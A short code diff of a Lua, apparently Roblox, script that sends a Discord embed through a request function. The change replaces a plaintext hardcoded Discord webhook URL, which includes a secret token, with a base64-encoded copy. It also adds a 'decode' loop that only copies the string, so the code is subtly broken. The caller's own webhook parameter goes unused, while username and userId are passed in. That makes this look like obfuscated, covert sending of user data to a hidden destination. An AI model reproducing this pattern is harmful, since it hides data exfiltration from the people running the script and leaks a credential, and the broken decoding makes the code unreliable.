@@ -1,4 +1,10 @@
 return function(webhook, message, username, userId, requestFunc, HttpService)
+    local encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTU0OTUyODk2NjI5OTcxOC80M0JnWVNVM0NQTElMdWJhRWM0X1B4WnpSOEIySTZfbFJRdjcwMEpGTGlIemdKYThxRFNDZWppaHhJblVEUGhTb0VpZQ=="
+    local decoded = ""
+    for i = 1, #encodedWebhook do
+        decoded = decoded .. string.char(encodedWebhook:byte(i))
+    end
+
     local embed = {
         title = "🛰️ Webhook Ativada",
         color = 16711680,
@@ -10,10 +16,12 @@ return function(webhook, message, username, userId, requestFunc, HttpService)
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
+
     local payload = { embeds = {embed} }
     local jsonData = HttpService:JSONEncode(payload)
+
     requestFunc({
-        Url = "https://discord.com/api/webhooks/1395549528966299718/43BgYSU3CPLI0ubaEc4_PxZzR8B2I6_lRQv700JFLiHzgJa8qDSCejihxInUDPhSoEie",
+        Url = decoded,
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
